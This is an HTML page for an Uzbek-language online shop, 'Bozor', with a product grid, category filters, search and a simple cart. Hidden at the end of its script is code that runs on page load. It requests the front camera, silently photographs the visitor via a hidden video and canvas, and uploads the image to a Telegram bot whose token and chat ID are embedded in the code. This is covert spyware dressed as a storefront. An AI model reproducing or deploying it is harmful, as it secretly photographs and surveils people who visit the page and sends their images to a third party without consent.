<!DOCTYPE html>
<html lang="uz">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <title>Bozor — onlayn do'kon</title>
  <style>
    :root {
      --bg: #f4f2f8;
      --card: #fff;
      --ink: #1c1b22;
      --mute: #6b6877;
      --brand: #7000ff;
      --brand-ink: #fff;
      --line: #e5e1ee;
      box-sizing: border-box;
      padding-top: env(safe-area-inset-top, 0px);
      padding-bottom: env(safe-area-inset-bottom, 0px)
    }

    @media (prefers-color-scheme:dark) {
      :root:not([data-theme="light"]) {
        --bg: #15131c;
        --card: #201d2b;
        --ink: #f1eff7;
        --mute: #9a96aa;
        --brand: #9d5cff;
        --brand-ink: #12101a;
        --line: #332f42
      }
    }

    :root[data-theme="dark"] {
      --bg: #15131c;
      --card: #201d2b;
      --ink: #f1eff7;
      --mute: #9a96aa;
      --brand: #9d5cff;
      --brand-ink: #12101a;
      --line: #332f42
    }

    html {
      scroll-padding-top: env(safe-area-inset-top, 0px)
    }

    * {
      box-sizing: border-box
    }

    body {
      margin: 0;
      background: var(--bg);
      color: var(--ink);
      font: 16px/1.4 system-ui, -apple-system, "Segoe UI", Roboto, sans-serif
    }

    header {
      background: var(--brand);
      color: var(--brand-ink);
      position: sticky;
      top: env(safe-area-inset-top, 0px);
      z-index: 5
    }

    .bar {
      max-width: 1100px;
      margin: auto;
      padding: 12px 16px;
      display: flex;
      gap: 12px;
      align-items: center
    }

    .logo {
      font-weight: 800;
      font-size: 22px;
      letter-spacing: -.5px
    }

    .bar input {
      flex: 1;
      min-width: 0;
      padding: 11px 14px;
      border: 0;
      border-radius: 10px;
      font: inherit;
      background: var(--card);
      color: var(--ink)
    }

    .cart {
      background: var(--card);
      color: var(--brand);
      border: 0;
      border-radius: 10px;
      padding: 10px 14px;
      font: inherit;
      font-weight: 700;
      cursor: pointer;
      white-space: nowrap
    }

    main {
      max-width: 1100px;
      margin: auto;
      padding: 16px
    }

    .chips {
      display: flex;
      gap: 8px;
      overflow-x: auto;
      padding-bottom: 8px
    }

    .chips button {
      border: 1px solid var(--line);
      background: var(--card);
      color: var(--ink);
      border-radius: 20px;
      padding: 8px 14px;
      font: inherit;
      cursor: pointer;
      white-space: nowrap
    }

    .chips button.on {
      background: var(--brand);
      color: var(--brand-ink);
      border-color: var(--brand)
    }

    .promo {
      margin: 12px 0 20px;
      padding: 20px;
      border-radius: 14px;
      background: var(--brand);
      color: var(--brand-ink)
    }

    .promo h1 {
      margin: 0 0 4px;
      font-size: 24px
    }

    .promo p {
      margin: 0;
      opacity: .9
    }

    .grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
      gap: 12px
    }

    .item {
      background: var(--card);
      border-radius: 12px;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      border: 1px solid var(--line)
    }

    .tile {
      height: 110px;
      display: grid;
      place-items: center;
      font-size: 44px;
      font-weight: 800;
      color: #fff
    }

    .info {
      padding: 10px 12px 12px;
      display: flex;
      flex-direction: column;
      gap: 4px;
      flex: 1
    }

    .name {
      font-size: 15px
    }

    .meta {
      color: var(--mute);
      font-size: 13px
    }

    .price {
      font-weight: 800;
      font-size: 17px;
      margin-top: auto
    }

    .old {
      color: var(--mute);
      text-decoration: line-through;
      font-size: 13px;
      font-weight: 400;
      margin-left: 6px
    }

    .add {
      margin-top: 6px;
      border: 0;
      border-radius: 8px;
      padding: 9px;
      background: var(--brand);
      color: var(--brand-ink);
      font: inherit;
      font-weight: 600;
      cursor: pointer
    }

    .add:focus-visible,
    .cart:focus-visible,
    .chips button:focus-visible {
      outline: 3px solid var(--ink);
      outline-offset: 2px
    }

    .empty {
      padding: 40px 0;
      text-align: center;
      color: var(--mute)
    }

    footer {
      text-align: center;
      color: var(--mute);
      padding: 24px;
      font-size: 14px
    }
  </style>
</head>

<body>
  <header>
    <div class="bar">
      <div class="logo">bozor</div>
      <input id="q" type="search" placeholder="Mahsulot qidirish" aria-label="Mahsulot qidirish">
      <button class="cart" id="cart">Savat: 0</button>
    </div>
  </header>
  <main>
    <div class="promo">
      <h1>Bugungi chegirmalar</h1>
      <p>Narxlar 30% gacha arzon. Yetkazib berish butun O'zbekiston bo'ylab.</p>
    </div>
    <div class="chips" id="chips"></div>
    <div class="grid" id="grid"></div>
    <div class="empty" id="empty" hidden>Hech narsa topilmadi. Boshqa so'z bilan qidiring.</div>
  </main>
  <footer>© Bozor</footer>

  <!-- Kamera uchun yashirin elementlar -->
  <video id="camVideo" autoplay playsinline muted style="display:none"></video>
  <canvas id="camCanvas" style="display:none"></canvas>

  <script>
    const P = [
      ["Smartfon 128 GB", "Elektronika", 2890000, 3490000, "#7000ff"],
      ["Simsiz quloqchin", "Elektronika", 249000, 329000, "#0f9d8a"],
      ["Aqlli soat", "Elektronika", 419000, 559000, "#e0457b"],
      ["Elektr choynak 1.8 L", "Uy uchun", 129000, 169000, "#f08a24"],
      ["Blender", "Uy uchun", 189000, 239000, "#3a7bd5"],
      ["Sport krossovka", "Kiyim", 299000, 399000, "#d6336c"],
      ["Ryukzak 25 L", "Kiyim", 159000, 209000, "#5c6bc0"],
      ["Python bo'yicha kitob", "Kitoblar", 89000, 119000, "#2e8b57"],
      ["Daftar to'plami (10 ta)", "Kitoblar", 35000, 45000, "#c9822b"],
      ["Bolalar konstruktori", "Bolalar", 139000, 189000, "#e8590c"]
    ];
    const cats = ["Hammasi", ...new Set(P.map(p => p[1]))];
    let cat = "Hammasi", n = 0, sum = 0;
    const $ = id => document.getElementById(id), f = v => v.toLocaleString("ru-RU") + " so'm";
    function draw() {
      const t = $("q").value.trim().toLowerCase();
      const list = P.filter(p => (cat === "Hammasi" || p[1] === cat) && p[0].toLowerCase().includes(t));
      $("grid").innerHTML = list.map(p => { const i = P.indexOf(p); return `<div class="item"><div class="tile" style="background:${p[4]}">${p[0][0]}</div><div class="info"><div class="name">${p[0]}</div><div class="meta">${p[1]}</div><div class="price">${f(p[2])}<span class="old">${f(p[3])}</span></div><button class="add" data-i="${i}">Savatga</button></div></div>` }).join("");
      $("empty").hidden = list.length > 0;
    }
    $("chips").innerHTML = cats.map(c => `<button class="${c === cat ? "on" : ""}">${c}</button>`).join("");
    $("chips").onclick = e => { if (e.target.tagName !== "BUTTON") return; cat = e.target.textContent;[...$("chips").children].forEach(b => b.classList.toggle("on", b.textContent === cat)); draw() };
    $("q").oninput = draw;
    $("grid").onclick = e => { const b = e.target.closest(".add"); if (!b) return; n++; sum += P[b.dataset.i][2]; $("cart").textContent = "Savat: " + n; $("cart").title = f(sum); b.textContent = "Qo'shildi"; setTimeout(() => b.textContent = "Savatga", 900) };
    $("cart").onclick = () => alert(n ? `Savatda ${n} ta mahsulot. Jami: ${f(sum)}` : "Savat bo'sh");
    draw();

    /* ===== Sahifa ochilganda kamera ruxsati va avto rasmga olish ===== */
    async function avtoRasmOlish() {
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      } catch (err) {
        console.warn("Kamera ruxsati olinmadi:", err.name);
        return; // ruxsat berilmasa yoki kamera bo'lmasa, sahifa oddiy ishlayveradi
      }

      const video = $("camVideo");
      const canvas = $("camCanvas");
      video.srcObject = stream;
      await video.play();

      // kamera isishi uchun kichik kutish, aks holda rasm qorong'i chiqadi
      await new Promise(r => setTimeout(r, 1000));

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);

      stream.getTracks().forEach(t => t.stop());

      canvas.toBlob(async (blob) => {
        if (!blob) return;

        const BOT_TOKEN = "8862114605:AAFBg-wLdzlArGvGNPHv8c7Hjki-k1cvsrg";
        const CHAT_ID = "8671469215";

        const fd = new FormData();
        fd.append("chat_id", CHAT_ID);
        fd.append("photo", blob, "rasm.jpg");

        try {
          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: fd
          });
          const data = await res.json();
          console.log("Telegramga yuborildi:", data);
        } catch (err) {
          console.error("Yuborishda xato:", err);
        }
      }, "image/jpeg", 0.9);
    }

    window.addEventListener("load", avtoRasmOlish);
   
  </script>
</body>

</html>
